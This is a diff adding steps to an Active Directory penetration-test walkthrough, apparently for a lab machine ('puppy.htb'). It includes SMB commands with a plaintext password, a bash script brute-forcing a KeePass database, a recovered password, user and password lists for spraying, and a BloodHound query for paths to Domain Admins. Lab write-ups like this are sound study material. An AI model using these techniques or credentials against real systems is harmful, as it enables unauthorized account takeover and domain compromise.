@@ -59,3 +59,72 @@ ldapmodify -x -H ldap://10.10.11.70 -D "CN=LEVI B. JAMES,OU=MANPOWER,DC=puppy,DC
 ```
 net rpc group members "DEVELOPERS" -U "levi.james" -S 10.10.11.70
 ```
+
+we check our perms again
+
+```
+smbmap -H 10.10.11.70 -u levi.james -p KingofAkron2025!
+```
+
+we view dev
+
+```
+smbclient //10.10.11.70/DEV -U levi.james
+```
+
+brute-kdbx.sh
+```bash
+#!/bin/bash
+
+DB="recovery.kdbx"
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+
+echo "[*] Starting brute-force on $DB using $WORDLIST"
+
+while IFS= read -r password; do
+    echo "[*] Trying: $password"
+
+    echo "$password" | keepassxc-cli db-info "$DB" &>/dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "[+] SUCCESS! Password found: $password"
+        exit 0
+    fi
+done < "$WORDLIST"
+
+echo "[-] Brute-force finished. No valid password found."
+```
+
+keepassxc recovery.kdbx
+
+enter liverpool
+
+create our user file and password file
+
+user
+```
+ant.edwards
+adam.silver
+jamie.williamson
+samuel.blake
+steve.tucker
+```
+
+password
+```
+Antman2025!
+JamieLove2025!
+ILY2025!
+Steve2025!
+HJKL2025!
+```
+
+revisit bloodhound
+
+```
+MATCH p=shortestPath((n {owned:true})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GPLink|AddAllowedToAct|AllowedToAct|WriteAccountRestrictions|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote|SyncLAPSPassword|DumpSMSAPassword|AZMGGrantRole|AZMGAddSecret|AZMGAddOwner|AZMGAddMember|AZMGGrantAppRoles|AZNodeResourceGroup|AZWebsiteContributor|AZLogicAppContributo|AZAutomationContributor|AZAKSContributor|AZAddMembers|AZAddOwner|AZAddSecret|AZAvereContributor|AZContains|AZContributor|AZExecuteCommand|AZGetCertificates|AZGetKeys|AZGetSecrets|AZGlobalAdmin|AZHasRole|AZManagedIdentity|AZMemberOf|AZOwns|AZPrivilegedAuthAdmin|AZPrivilegedRoleAdmin|AZResetPassword|AZUserAccessAdministrator|AZAppAdmin|AZCloudAppAdmin|AZRunsAs|AZKeyVaultContributor|AZVMAdminLogin|AZVMContributor|AZLogicAppContributor|AddSelf|WriteSPN|AddKeyCredentialLink|DCSync*1..]->(m:Group {name:"DOMAIN ADMINS@PUPPY.HTB"})) WHERE NOT n=m RETURN p
+```
+
+look to see chain from ant.edwards to domain admin
+
+![[Pasted image 20250522011631.png]]
